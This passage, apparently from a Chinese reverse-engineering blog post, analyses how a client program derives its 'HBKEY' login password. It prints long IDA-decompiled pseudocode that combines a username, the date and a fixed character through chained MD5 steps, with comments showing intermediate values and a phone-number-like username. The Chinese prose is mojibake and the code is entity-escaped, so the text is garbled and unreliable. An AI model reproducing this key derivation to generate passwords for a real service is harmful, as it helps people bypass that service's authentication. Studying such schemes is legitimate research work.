è½½çš„åŸºå€ï¼Œå³å¯æ‰¾åˆ°è¿™ä¸ªå‡½æ•°ã€‚\nè¿™ä¸ªå‡½æ•°çš„å¤§è‡´ä½œç”¨å°±æ˜¯ä¿®æ”¹ä¸Šé¢æˆ‘ä»¬å¾—åˆ°çš„ E\nE[ä»Šå¤©å‡ å·æ—¥æœŸ % 16] æ›¿æ¢ä¸º \u0026lsquo;b\u0026rsquo; å¾—åˆ°æœ€åçš„å¯†ç  è¿™å—æˆ‘ä»¬æ˜¯ææ¸…æ¥šäº†ï¼Œé‚£ key æ˜¯æ€ä¹ˆæ¥çš„å‘¢ã€‚\nè¿™ä¸ªæˆ‘ä»¬å°±éœ€è¦å¤§é‡å€ŸåŠ©è°ƒè¯•å™¨äº†ï¼Œæˆ‘ä»¬é‡å¯ä¸€ä¸‹ä¸»ç¨‹åºï¼Œç„¶ååœ¨ä¸Šé¢çš„åˆ†æåŸºç¡€ä¸Šæ‰¾åˆ°è¿™ä¸ª key ç¬¬ä¸€æ¬¡å‡ºç°çš„åœ°æ–¹ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç° åœ¨ AidcRes åç§» 10110 å¤„å³ä¸º key çš„ç”Ÿæˆå‡½æ•°ã€‚\nè¿™ä¸ªå‡½æ•°å·¨é•¿ï¼ŒåŒæ ·çš„ï¼Œæˆ‘ä»¬å€ŸåŠ©ä¹‹å‰çš„æ–¹æ³•åœ¨ IDA ä¸­æ‰¾åˆ°è¿™ä¸ªå‡½æ•°ï¼Œæˆ‘è¿™é‡Œç›´æ¥æŒ‰åç§»ï¼Œå¯ä»¥çœ‹åˆ°åœ¨ sub_420110 å³ä¸ºæˆ‘ä»¬çš„åŠ å¯†å‡½æ•°ï¼Œ è¿™é‡Œæˆ‘å·²ç»é‡å‘½åä¸º generateKeyã€‚\nè¿™ä¸ªå‡½æ•°å¤ªé•¿äº†ï¼Œæˆ‘æ— æ³•æˆªå…¨å›¾ï¼Œæˆ‘ç›´æ¥ä¸¢ä»£ç ç„¶ååˆ†æï¼Œè¿™é‡Œåˆ†æå»ºè®®å¤§å®¶è°ƒè¯•ç»“åˆä»£ç æ¥çœ‹ï¼Œä¸ç„¶ä¸€å¤´é›¾æ°´ã€‚å…¶ä¸­å¤§é‡çš„å¿…è¦å˜é‡å’Œå‡½æ•°æˆ‘å·²ç»é‡å‘½åï¼Œæ–¹ä¾¿å¤§å®¶é˜…è¯»ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199 200 201 202 203 204 205 206 207 208 209 210 211 212 213 214 215 216 217 218 219 220 221 222 223 224 225 226 227 228 229 230 231 232 233 234 235 236 237 238 239 240 241 242 243 244 245 246 247 248 249 250 251 252 253 254 255 256 257 258 259 260 261 262 263 264 265 266 267 268 269 270 271 272 273 274 275 276 277 278 279 280 281 282 283 284 285 286 287 288 289 290 291 292 293 294 295 296 297 298 299 300 301 302 303 304 305 306 307 308 309 310 311 312 313 314 315 316 317 318 319 320 321 322 323 324 325 326 327 328 329 330 331 332 333 334 335 336 337 338 339 340 341 342 343 344 345 346 347 348 349 350 351 352 353 354 355 356 357 358 359 360 361 362 363 364 365 366 367 368 369 370 371 372 373 374 375 376 377 378 379 380 381 382 383 384 385 386 387 388 389 390 391 392 393 394 395 396 397 398 399 400 401 402 403 404 405 406 407 408 409 410 411 412 413 414 415 416 417 418 419 420 421 422 423 424 425 426 427 428 429 430 431 432 433 434 435 436 437 438 439 440 441 442 443 444 445 446 447 448 449 450 451 452 453 454 455 456 457 458 459 460 461 462 463 464 465 466 467 468 469 470 471 472 473 474 475 476 477 478 479 480 481 482 483 484 485 486 487 488 489 490 491 492 493 494 495 496 497 498 499 500 501 502 503 504 505 506 507 508 509 510 511 512 513 514 515 516 517 518 519 520 521 522 int __thiscall generateKey(char *this, int a2, char a3, int a4, int a5, int a6, int a7, int a8) { int v8; // eax int v9; // edx int v11; // [esp+8h] [ebp-37Ch] char *v12; // [esp+20h] [ebp-364h] int len_username_b_MonthDay; // [esp+24h] [ebp-360h] char *v14; // [esp+28h] [ebp-35Ch] int len_bUsernameMonthDay; // [esp+2Ch] [ebp-358h] char *v16; // [esp+30h] [ebp-354h] char *mem_17; // [esp+34h] [ebp-350h] int v18; // [esp+38h] [ebp-34Ch] int lenMonthDay; // [esp+3Ch] [ebp-348h] int lenUsername; // [esp+40h] [ebp-344h] int v21; // [esp+44h] [ebp-340h] int v22; // [esp+48h] [ebp-33Ch] int *v23; // [esp+4Ch] [ebp-338h] int v24; // [esp+50h] [ebp-334h] const char *v25; // [esp+54h] [ebp-330h] int len_HbKeyGa; // [esp+58h] [ebp-32Ch] int lenHbKeyGa; // [esp+5Ch] [ebp-328h] char *pMem_64_a; // [esp+60h] [ebp-324h] int len_HbKeyGb; // [esp+64h] [ebp-320h] int lenHbKeyGb; // [esp+68h] [ebp-31Ch] char *pMem_64_b; // [esp+6Ch] [ebp-318h] int v32; // [esp+70h] [ebp-314h] int v33; // [esp+74h] [ebp-310h] int v34; // [esp+78h] [ebp-30Ch] int v35; // [esp+7Ch] [ebp-308h] int len_monthDay_Username_b; // [esp+80h] [ebp-304h] char *v37; // [esp+84h] [ebp-300h] int len_username_MonthDay_b; // [esp+88h] [ebp-2FCh] LPVOID lp_mix_md5_1; // [esp+8Ch] [ebp-2F8h] size_t v40; // [esp+90h] [ebp-2F4h] int v41; // [esp+94h] [ebp-2F0h] LPVOID v42; // [esp+98h] [ebp-2ECh] LPVOID v43; // [esp+9Ch] [ebp-2E8h] LPVOID v44; // [esp+A0h] [ebp-2E4h] int index3; // [esp+A4h] [ebp-2E0h] int index2; // [esp+A8h] [ebp-2DCh] char *pHbKeyGa; // [esp+ACh] [ebp-2D8h] int index6; // [esp+B0h] [ebp-2D4h] int index5; // [esp+B4h] [ebp-2D0h] _DWORD *md5_monthDay_Username_b; // [esp+B8h] [ebp-2CCh] _DWORD *md5_username_b_MonthDay; // [esp+BCh] [ebp-2C8h] _DWORD *md5_username_MonthDay_b; // [esp+C0h] [ebp-2C4h] void *mix_md5_1; // [esp+C4h] [ebp-2C0h] int md5_1_pLus3remainder4; // [esp+C8h] [ebp-2BCh] int md5_bUsernameMonthDay; // [esp+CCh] [ebp-2B8h] char *pHbKeyGb; // [esp+D0h] [ebp-2B4h] void *v57; // [esp+D4h] [ebp-2B0h] void *v58; // [esp+D8h] [ebp-2ACh] int md5_4_plus5remainer4; // [esp+DCh] [ebp-2A8h] void *mix_md5_2; // [esp+E0h] [ebp-2A4h] const char *userName; // [esp+E4h] [ebp-2A0h] char *monthDay; // [esp+E8h] [ebp-29Ch] char *bUsernameMonthDay; // [esp+ECh] [ebp-298h] char *username_b_MonthDay; // [esp+F0h] [ebp-294h] char *username_MonthDay_b; // [esp+F4h] [ebp-290h] char *monthDay_Username_b; // [esp+F8h] [ebp-28Ch] char *p_HbKeyGb; // [esp+FCh] [ebp-288h] char *p_HbKeyGa; // [esp+100h] [ebp-284h] const char *username; // [esp+104h] [ebp-280h] _DWORD *md5_2; // [esp+108h] [ebp-27Ch] _DWORD *md5_3; // [esp+10Ch] [ebp-278h] int index1; // [esp+114h] [ebp-270h] int index4; // [esp+118h] [ebp-26Ch] int temp1; // [esp+11Ch] [ebp-268h] int temp2; // [esp+120h] [ebp-264h] _DWORD *md5_4; // [esp+124h] [ebp-260h] int md5_1; // [esp+128h] [ebp-25Ch] size_t SizeInBytes; // [esp+134h] [ebp-250h] char *DstBuf; // [esp+138h] [ebp-24Ch] char *pThis; // [esp+13Ch] [ebp-248h] int v81; // [esp+140h] [ebp-244h] int v82; // [esp+144h] [ebp-240h] int v83; // [esp+148h] [ebp-23Ch] int v84; // [esp+14Ch] [ebp-238h] int v85; // [esp+150h] [ebp-234h] int v86; // [esp+154h] [ebp-230h] int v87; // [esp+158h] [ebp-22Ch] int v88; // [esp+15Ch] [ebp-228h] char hbKey; // [esp+160h] [ebp-224h] char v90; // [esp+161h] [ebp-223h] char hbKeyGa; // [esp+1E4h] [ebp-1A0h] char mem_64_a; // [esp+1E5h] [ebp-19Fh] char hbKeyGb; // [esp+228h] [ebp-15Ch] char mem_64_b; // [esp+229h] [ebp-15Bh] char v95; // [esp+22Fh] [ebp-155h] char v96[4]; // [esp+26Ch] [ebp-118h] char v97[5]; // [esp+270h] [ebp-114h] int v98; // [esp+275h] [ebp-10Fh] int v99; // [esp+279h] [ebp-10Bh] int v100; // [esp+27Dh] [ebp-107h] int v101; // [esp+281h] [ebp-103h] int v102; // [esp+285h] [ebp-FFh] __int16 v103; // [esp+289h] [ebp-FBh] char v104; // [esp+28Bh] [ebp-F9h] char v105[4]; // [esp+28Ch] [ebp-F8h] char v106[5]; // [esp+290h] [ebp-F4h] int v107; // [esp+295h] [ebp-EFh] int v108; // [esp+299h] [ebp-EBh] int v109; // [esp+29Dh] [ebp-E7h] int v110; // [esp+2A1h] [ebp-E3h] int v111; // [esp+2A5h] [ebp-DFh] __int16 v112; // [esp+2A9h] [ebp-DBh] char v113; // [esp+2ABh] [ebp-D9h] char v114[4]; // [esp+2ACh] [ebp-D8h] char v115[5]; // [esp+2B0h] [ebp-D4h] int v116; // [esp+2B5h] [ebp-CFh] int v117; // [esp+2B9h] [ebp-CBh] int v118; // [esp+2BDh] [ebp-C7h] int v119; // [esp+2C1h] [ebp-C3h] int v120; // [esp+2C5h] [ebp-BFh] __int16 v121; // [esp+2C9h] [ebp-BBh] char v122; // [esp+2CBh] [ebp-B9h] char v123[4]; // [esp+2CCh] [ebp-B8h] char v124[5]; // [esp+2D0h] [ebp-B4h] int v125; // [esp+2D5h] [ebp-AFh] int v126; // [esp+2D9h] [ebp-ABh] int v127; // [esp+2DDh] [ebp-A7h] int v128; // [esp+2E1h] [ebp-A3h] int v129; // [esp+2E5h] [ebp-9Fh] __int16 v130; // [esp+2E9h] [ebp-9Bh] char v131; // [esp+2EBh] [ebp-99h] char char_array_29_2[29]; // [esp+2ECh] [ebp-98h] __int16 v133; // [esp+309h] [ebp-7Bh] char v134; // [esp+30Bh] [ebp-79h] char char_array_29_1[29]; // [esp+30Ch] [ebp-78h] __int16 v136; // [esp+329h] [ebp-5Bh] char v137; // [esp+32Bh] [ebp-59h] char char_array_29_3[29]; // [esp+32Ch] [ebp-58h] __int16 v139; // [esp+349h] [ebp-3Bh] char v140; // [esp+34Bh] [ebp-39h] char char_array_29_4[29]; // [esp+34Ch] [ebp-38h] __int16 v142; // [esp+369h] [ebp-1Bh] char v143; // [esp+36Bh] [ebp-19h] char month_day; // [esp+36Ch] [ebp-18h] int v145; // [esp+36Dh] [ebp-17h] int v146; // [esp+380h] [ebp-4h] pThis = this; v41 = 0; v146 = 0; username = 0; v40 = sub_421680(\u0026#34;@hbxy\u0026#34;, 0); if ( v40 != -1 ) { v33 = sub_421630((int)\u0026amp;v11, 0, v40); std::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator=(v33); std::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::~basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;(\u0026amp;v11); } username = (const char *)get_username(\u0026amp;a3); userName = username; v25 = username + 1; userName += strlen(userName); v24 = ++userName - (username + 1); lenUsername = userName - (username + 1); month_day = 0; v145 = 0; strftime(\u0026amp;month_day, 5u, \u0026#34;%m%d\u0026#34;, (const struct tm *)(pThis + 8)); monthDay = \u0026amp;month_day; v23 = \u0026amp;v145; monthDay += strlen(monthDay); v21 = ++monthDay - (char *)\u0026amp;v145; lenMonthDay = monthDay - (char *)\u0026amp;v145; (*(void (**)(char *, const char *, ...))(*(_DWORD *)pThis + 4))(pThis, \u0026#34;\u0026gt;\u0026gt;\u0026gt; GetHBKey: %s \u0026gt;\u0026gt;\u0026gt;\u0026#34;, \u0026amp;month_day); v18 = 1; SizeInBytes = lenMonthDay + lenUsername + 2; mem_17 = (char *)malloc(SizeInBytes); DstBuf = mem_17; memset(mem_17, 0, SizeInBytes); sprintf_s(DstBuf, SizeInBytes, \u0026#34;%c%s%s\u0026#34;, pThis[4], username, \u0026amp;month_day);// \u0026#34;b177628979080516\u0026#34; bUsernameMonthDay = DstBuf; v16 = DstBuf + 1; bUsernameMonthDay += strlen(bUsernameMonthDay); len_bUsernameMonthDay = ++bUsernameMonthDay - (DstBuf + 1); md5_bUsernameMonthDay = md5_StrWithLength(DstBuf, bUsernameMonthDay - (DstBuf + 1));// 5e64fdaa6449e2abb9693f2757c11652 (*(void (**)(char *, const char *, ...))(*(_DWORD *)pThis + 4))( pThis, \u0026#34;[HBKEY] mdata1: %s [%s]\u0026#34;, DstBuf, md5_bUsernameMonthDay); memset(DstBuf, 0, SizeInBytes); sprintf_s(DstBuf, SizeInBytes, \u0026#34;%s%c%s\u0026#34;, username, pThis[4], \u0026amp;month_day);// \u0026#34;17762897908b0516\u0026#34; username_b_MonthDay = DstBuf; v14 = DstBuf + 1; username_b_MonthDay += strlen(username_b_MonthDay); len_username_b_MonthDay = ++username_b_MonthDay - (DstBuf + 1); md5_username_b_MonthDay = (_DWORD *)md5_StrWithLength(DstBuf, username_b_MonthDay - (DstBuf + 1));// 16dffe496172e2fb1bdb9b2002bfb5a5 (*(void (**)(char *, const char *, ...))(*(_DWORD *)pThis + 4))( pThis, \u0026#34;[HBKEY] mdata2: %s [%s]\u0026#34;, DstBuf, md5_username_b_MonthDay); memset(DstBuf, 0, SizeInBytes); sprintf_s(DstBuf, SizeInBytes, \u0026#34;%s%s%c\u0026#34;, username, \u0026amp;month_day, pThis[4]);// \u0026#34;177628979080516b\u0026#34; username_MonthDay_b = DstBuf; v12 = DstBuf + 1; username_MonthDay_b += strlen(username_MonthDay_b); len_username_MonthDay_b = ++username_MonthDay_b - (DstBuf + 1); md5_username_MonthDay_b = (_DWORD *)md5_StrWithLength(DstBuf, username_MonthDay_b - (DstBuf + 1));// 6614da7943beed0e7baafc0be7fb624c (*(void (**)(char *, const char *, ...))(*(_DWORD *)pThis + 4))( pThis, \u0026#34;[HBKEY] mdata3: %s [%s]\u0026#34;, DstBuf, md5_username_MonthDay_b); memset(DstBuf, 0, SizeInBytes); sprintf_s(DstBuf, SizeInBytes, \u0026#34;%s%s%c\u0026#34;, \u0026amp;month_day, username, pThis[4]);// \u0026#34;051617762897908b\u0026#34; monthDay_Username_b = DstBuf; v37 = DstBuf + 1; monthDay_Username_b += strlen(monthDay_Username_b); len_monthDay_Username_b = ++monthDay_Username_b - (DstBuf + 1); md5_monthDay_Username_b = (_DWORD *)md5_StrWithLength(DstBuf, monthDay_Username_b - (DstBuf + 1));// 2b28feebb48c0cb98b9f3da404fff646 (*(void (**)(char *, const char *, ...))(*(_DWORD *)pThis + 4))( pThis, \u0026#34;[HBKEY] mdata4: %s [%s]\u0026#34;, DstBuf, md5_monthDay_Username_b); md5_1 = 0; md5_2 = 0; md5_3 = 0; md5_4 = 0; if ( *(char *)(md5_bUsernameMonthDay + 1) % 2 ) { md5_1 = md5_bUsernameMonthDay; md5_2 = md5_username_MonthDay_b; md5_3 = md5_username_b_MonthDay; md5_4 = md5_monthDay_Username_b; } else { md5_1 = md5_bUsernameMonthDay; md5_2 = md5_monthDay_Username_b; md5_3 = md5_username_b_MonthDay; md5_4 = md5_username_MonthDay_b; } hbKeyGa = 0; memset(\u0026amp;mem_64_a, 0, 0x40u); md5_1_pLus3remainder4 = *(char *)(md5_1 + 3) % 4; // ä»¥ä¸‹ä¸€è¿ä¸²çš„èµ‹å€¼æ˜¯ä½¿ char_array_29_1 = md5_1, char_array_29_2 = md5_2 char_array_29_1[0] = 0; *(_DWORD *)\u0026amp;char_array_29_1[1] = 0; *(_DWORD *)\u0026amp;char_array_29_1[5] = 0; *(_DWORD *)\u0026amp;char_array_29_1[9] = 0; *(_DWORD *)\u0026amp;char_array_29_1[13] = 0; *(_DWORD *)\u0026amp;char_array_29_1[17] = 0; *(_DWORD *)\u0026amp;char_array_29_1[21] = 0; *(_DWORD *)\u0026amp;char_array_29_1[25] = 0; v136 = 0; v137 = 0; char_array_29_2[0] = 0; *(_DWORD *)\u0026amp;char_array_29_2[1] = 0; *(_DWORD *)\u0026amp;char_array_29_2[5] = 0; *(_DWORD *)\u0026amp;char_array_29_2[9] = 0; *(_DWORD *)\u0026amp;char_array_29_2[13] = 0; *(_DWORD *)\u0026amp;char_array_29_2[17] = 0; *(_DWORD *)\u0026amp;char_array_29_2[21] = 0; *(_DWORD *)\u0026amp;char_array_29_2[25] = 0; v133 = 0; v134 = 0; *(_DWORD *)char_array_29_1 = *(_DWORD *)md5_1; *(_DWORD *)\u0026amp;char_array_29_1[4] = *(_DWORD *)(md5_1 + 4); *(_DWORD *)\u0026amp;char_array_29_1[8] = *(_DWORD *)(md5_1 + 8); *(_DWORD *)\u0026amp;char_array_29_1[12] = *(_DWORD *)(md5_1 + 12); *(_DWORD *)\u0026amp;char_array_29_1[16] = *(_DWORD *)(md5_1 + 16); *(_DWORD *)\u0026amp;char_array_29_1[20] = *(_DWORD *)(md5_1 + 20); *(_DWORD *)\u0026amp;char_array_29_1[24] = *(_DWORD *)(md5_1 + 24); *(_DWORD *)\u0026amp;char_array_29_1[28] = *(_DWORD *)(md5_1 + 28); *(_DWORD *)char_array_29_2 = *md5_2; *(_DWORD *)\u0026amp;char_array_29_2[4] = md5_2[1]; *(_DWORD *)\u0026amp;char_array_29_2[8] = md5_2[2]; *(_DWORD *)\u0026amp;char_array_29_2[12] = md5_2[3]; *(_DWORD *)\u0026amp;char_array_29_2[16] = md5_2[4]; *(_DWORD *)\u0026amp;char_array_29_2[20] = md5_2[5]; *(_DWORD *)\u0026amp;char_array_29_2[24] = md5_2[6]; *(_DWORD *)\u0026amp;char_array_29_2[28] = md5_2[7]; v81 = md5_1_pLus3remainder4; // 0 v82 = abs(md5_1_pLus3remainder4 - 5) % 4; // 1 v8 = (md5_1_pLus3remainder4 + 2) % 4; // 2 v83 = (md5_1_pLus3remainder4 + 2) % 4; // 2 v84 = abs(md5_1_pLus3remainder4 - 3); // 3 v96[0] = 0; *(_DWORD *)\u0026amp;v96[1] = 0; *(_DWORD *)\u0026amp;v97[1] = 0; v98 = 0; v99 = 0; v100 = 0; v101 = 0; v102 = 0; v103 = 0; v104 = 0; v105[0] = 0; *(_DWORD *)\u0026amp;v105[1] = 0; *(_DWORD *)\u0026amp;v106[1] = 0; v107 = 0; v108 = 0; v109 = 0; v110 = 0; v111 = 0; v112 = 0; v113 = 0; *(_DWORD *)v96 = *(_DWORD *)\u0026amp;char_array_29_1[8 * md5_1_pLus3remainder4]; *(_DWORD *)v97 = *(_DWORD *)\u0026amp;char_array_29_1[8 * md5_1_pLus3remainder4 + 4]; *(_DWORD *)\u0026amp;v97[4] = *(_DWORD *)\u0026amp;char_array_29_2[8 * v82]; *(int *)((char *)\u0026amp;v98 + 3) = *(_DWORD *)\u0026amp;char_array_29_2[8 * v82 + 4]; *(int *)((char *)\u0026amp;v99 + 3) = *(_DWORD *)\u0026amp;char_array_29_1[8 * v8]; *(int *)((char *)\u0026amp;v100 + 3) = *(_DWORD *)\u0026amp;char_array_29_1[8 * v8 + 4]; *(int *)((char *)\u0026amp;v101 + 3) = *(_DWORD *)\u0026amp;char_array_29_2[8 * v84]; *(int *)((char *)\u0026amp;v102 + 3) = *(_DWORD *)\u0026amp;char_array_29_2[8 * v84 + 4]; *(_DWORD *)v105 = *(_DWORD *)\u0026amp;char_array_29_2[8 * md5_1_pLus3remainder4]; *(_DWORD *)v106 = *(_DWORD *)\u0026amp;char_array_29_2[8 * md5_1_pLus3remainder4 + 4]; *(_DWORD *)\u0026amp;v106[4] = *(_DWORD *)\u0026amp;char_array_29_1[8 * v82]; *(int *)((char *)\u0026amp;v107 + 3) = *(_DWORD *)\u0026amp;char_array_29_1[8 * v82 + 4]; *(int *)((char *)\u0026amp;v108 + 3) = *(_DWORD *)\u0026amp;char_array_29_2[8 * v8]; *(int *)((char *)\u0026amp;v109 + 3) = *(_DWORD *)\u0026amp;char_array_29_2[8 * v8 + 4]; *(int *)((char *)\u0026amp;v110 + 3) = *(_DWORD *)\u0026amp;char_array_29_1[8 * v84]; *(int *)((char *)\u0026amp;v111 + 3) = *(_DWORD *)\u0026amp;char_array_29_1[8 * v84 + 4]; mix_md5_1 = (void *)md5_StrWithLength(v96, 32);// ç¬¬ä¸€ä¸ªå‚æ•° 5e64fdaa43beed0eb9693f27e7fb624c6614da796449e2ab7baafc0b57c11652 // è¿”å›å€¼ 5008ef506febfc228802dd43b99c1869 // ä¸º 5e64fdaa43beed0eb9693f27e7fb624c çš„ md5 mix_md5_2 = (void *)md5_StrWithLength(v105, 32);// ç¬¬ä¸€ä¸ªå‚æ•° 6614da796449e2ab7baafc0b57c11652 // è¿”å›å€¼ 46e4a9da513469a20da82e3136f46951 sprintf_s(\u0026amp;hbKeyGa, 0x41u, \u0026#34;%s%s\u0026#34;, mix_md5_1, mix_md5_2);// hbKeyGa = \u0026#34;5008ef506febfc228802dd43b99c186946e4a9da513469a20da82e3136f46951\u0026#34; lp_mix_md5_1 = mix_md5_1; j_j___free_base(mix_md5_1); if ( lp_mix_md5_1 ) { mix_md5_1 = (void *)33059; v35 = 33059; } else { v35 = 0; } v44 = mix_md5_2; j_j___free_base(mix_md5_2); if ( v44 ) { mix_md5_2 = (void *)33059; v34 = 33059; } else { v34 = 0; } (*(void (**)(char *, const char *, ...))(*(_DWORD *)pThis + 4))(pThis, \u0026#34;[HBKEY] ga: %s\u0026#34;, \u0026amp;hbKeyGa); hbKeyGb = 0; memset(\u0026amp;mem_64_b, 0, 0x40u); md5_4_plus5remainer4 = *((char *)md5_4 + 5) % 4; // ä»¥ä¸‹ä¸€è¿ä¸²çš„èµ‹å€¼æ˜¯ä½¿ char_array_29_3 = md5_3, char_array_29_4 = md5_4 char_array_29_3[0] = 0; *(_DWORD *)\u0026amp;char_array_29_3[1] = 0; *(_DWORD *)\u0026amp;char_array_29_3[5] = 0; *(_DWORD *)\u0026amp;char_array_29_3[9] = 0; *(_DWORD *)\u0026amp;char_array_29_3[13] = 0; *(_DWORD *)\u0026amp;char_array_29_3[17] = 0; *(_DWORD *)\u0026amp;char_array_29_3[21] = 0; *(_DWORD *)\u0026amp;char_array_29_3[25] = 0; v139 = 0; v140 = 0; char_array_29_4[0] = 0; *(_DWORD *)\u0026amp;char_array_29_4[1] = 0; *(_DWORD *)\u0026amp;char_array_29_4[5] = 0; *(_DWORD *)\u0026amp;char_array_29_4[9] = 0; *(_DWORD *)\u0026amp;char_array_29_4[13] = 0; *(_DWORD *)\u0026amp;char_array_29_4[17] = 0; *(_DWORD *)\u0026amp;char_array_29_4[21] = 0; *(_DWORD *)\u0026amp;char_array_29_4[25] = 0; v142 = 0; v143 = 0; *(_DWORD *)char_array_29_3 = *md5_3; *(_DWORD *)\u0026amp;char_array_29_3[4] = md5_3[1]; *(_DWORD *)\u0026amp;char_array_29_3[8] = md5_3[2]; *(_DWORD *)\u0026amp;char_array_29_3[12] = md5_3[3]; *(_DWORD *)\u0026amp;char_array_29_3[16] = md5_3[4]; *(_DWORD *)\u0026amp;char_array_29_3[20] = md5_3[5]; *(_DWORD *)\u0026amp;char_array_29_3[24] = md5_3[6]; *(_DWORD *)\u0026amp;char_array_29_3[28] = md5_3[7]; *(_DWORD *)char_array_29_4 = *md5_4; *(_DWORD *)\u0026amp;char_array_29_4[4] = md5_4[1]; *(_DWORD *)\u0026amp;char_array_29_4[8] = md5_4[2]; *(_DWORD *)\u0026amp;char_array_29_4[12] = md5_4[3]; *(_DWORD *)\u0026amp;char_array_29_4[16] = md5_4[4]; *(_DWORD *)\u0026amp;char_array_29_4[20] = md5_4[5]; *(_DWORD *)\u0026amp;char_array_29_4[24] = md5_4[6]; *(_DWORD *)\u0026amp;char_array_29_4[28] = md5_4[7]; v85 = md5_4_plus5remainer4; // 1 v86 = abs(md5_4_plus5remainer4 - 5) % 4; // 0 v9 = (md5_4_plus5remainer4 + 2) % 4; // 3 v87 = (md5_4_plus5remainer4 + 2) % 4; // 3 v88 = abs(md5_4_plus5remainer4 - 3); // 2 v114[0] = 0; *(_DWORD *)\u0026amp;v114[1] = 0; *(_DWORD *)\u0026amp;v115[1] = 0; v116 = 0; v117 = 0; v118 = 0; v119 = 0; v120 = 0; v121 = 0; v122 = 0; v123[0] = 0; *(_DWORD *)\u0026amp;v123[1] = 0; *(_DWORD *)\u0026amp;v124[1] = 0; v125 = 0; v126 = 0; v127 = 0; v128 = 0; v129 = 0; v130 = 0; v131 = 0; *(_DWORD *)v114 = *(_DWORD *)\u0026amp;char_array_29_3[8 * md5_4_plus5remainer4]; *(_DWORD *)v115 = *(_DWORD *)\u0026amp;char_array_29_3[8 * md5_4_plus5remainer4 + 4]; *(_DWORD *)\u0026amp;v115[4] = *(_DWORD *)\u0026amp;char_array_29_4[8 * v86]; *(int *)((char *)\u0026amp;v116 + 3) = *(_DWORD *)\u0026amp;char_array_29_4[8 * v86 + 4]; *(int *)((char *)\u0026amp;v117 + 3) = *(_DWORD *)\u0026amp;char_array_29_3[8 * v9]; *(int *)((char *)\u0026amp;v118 + 3) = *(_DWORD *)\u0026amp;char_array_29_3[8 * v9 + 4]; *(int *)((char *)\u0026amp;v119 + 3) = *(_DWORD *)\u0026amp;char_array_29_4[8 * v88]; *(int *)((char *)\u0026amp;v120 + 3) = *(_DWORD *)\u0026amp;char_array_29_4[8 * v88 + 4]; *(_DWORD *)v123 = *(_DWORD *)\u0026amp;char_array_29_4[8 * md5_4_plus5remainer4]; *(_DWORD *)v124 = *(_DWORD *)\u0026amp;char_array_29_4[8 * md5_4_plus5remainer4 + 4]; *(_DWORD *)\u0026amp;v124[4] = *(_DWORD *)\u0026amp;char_array_29_3[8 * v86]; *(int *)((char *)\u0026amp;v125 + 3) = *(_DWORD *)\u0026amp;char_array_29_3[8 * v86 + 4]; *(int *)((char *)\u0026amp;v126 + 3) = *(_DWORD *)\u0026amp;char_array_29_4[8 * v9]; *(int *)((char *)\u0026amp;v127 + 3) = *(_DWORD *)\u0026amp;char_array_29_4[8 * v9 + 4]; *(int *)((char *)\u0026amp;v128 + 3) = *(_DWORD *)\u0026amp;char_array_29_3[8 * v88]; *(int *)((char *)\u0026amp;v129 + 3) = *(_DWORD *)\u0026amp;char_array_29_3[8 * v88 + 4]; v58 = (void *)md5_StrWithLength(v114, 32); // è¿”å›å€¼ 1ed63dc9a269d8705e297c03dcda7cf0 // ä¸º 6172e2fb2b28feeb02bfb5a58b9f3da4 çš„ md5 v57 = (void *)md5_StrWithLength(v123, 32); // è¿”å›å€¼ 25928da86463ce9beba8110d2d514464 // ä¸º b48c0cb916dffe4904fff6461bdb9b20 çš„ md5 sprintf_s(\u0026amp;hbKeyGb, 0x41u, \u0026#34;%s%s\u0026#34;, v58, v57); // hbKeyGb = \u0026#34;1ed63dc9a269d8705e297c03dcda7cf025928da86463ce9beba8110d2d514464\u0026#34; v43 = v58; j_j___free_base(v58); if ( v43 ) { v58 = (void *)33059; v22 = 33059; } else { v22 = 0; } v42 = v57; j_j___free_base(v57); if ( v42 ) { v57 = (void *)33059; v32 = 33059; } else { v32 = 0; } (*(void (**)(char *, const char *, ...))(*(_DWORD *)pThis + 4))(pThis, \u0026#34;[HBKEY] gb: %s\u0026#34;, \u0026amp;hbKeyGb); if ( v95 % 2 ) // ä»åæ±‡ç¼–ä¸­å¯çœ‹åˆ° v95 ä¸º hbkey_gb[7] { temp1 = 0; p_HbKeyGa = \u0026amp;hbKeyGa; pMem_64_a = \u0026amp;mem_64_a; p_HbKeyGa += strlen(p_HbKeyGa); lenHbKeyGa = ++p_HbKeyGa - \u0026amp;mem_64_a; len_HbKeyGa = p_HbKeyGa - \u0026amp;mem_64_a; while ( temp1 \u0026lt; len_HbKeyGa ) // æŠŠ HbKeyGa é‡Œé¢çš„å°å†™å­—æ¯å…¨æ›¿æ¢ä¸ºå¤§å†™ { if ( *(\u0026amp;hbKeyGa + temp1) \u0026gt;= 97 \u0026amp;\u0026amp; *(\u0026amp;hbKeyGa + temp1) \u0026lt;= 122 ) *(\u0026amp;hbKeyGa + temp1) -= 32; ++temp1; } } else { temp2 = 0; p_HbKeyGb = \u0026amp;hbKeyGb; pMem_64_b = \u0026amp;mem_64_b; p_HbKeyGb += strlen(p_HbKeyGb); lenHbKeyGb = ++p_HbKeyGb - \u0026amp;mem_64_b; len_HbKeyGb = p_HbKeyGb - \u0026amp;mem_64_b; while ( temp2 \u0026lt; len_HbKeyGb ) // æŠŠ HbKeyGb é‡Œé¢çš„å°å†™å­—æ¯å…¨æ›¿æ¢ä¸ºå¤§å†™ { if ( *(\u0026amp;hbKeyGb + temp2) \u0026gt;= 97 \u0026amp;\u0026amp; *(\u0026amp;hbKeyGb + temp2) \u0026lt;= 122 ) *(\u0026amp;hbKeyGb + temp2) -= 32; 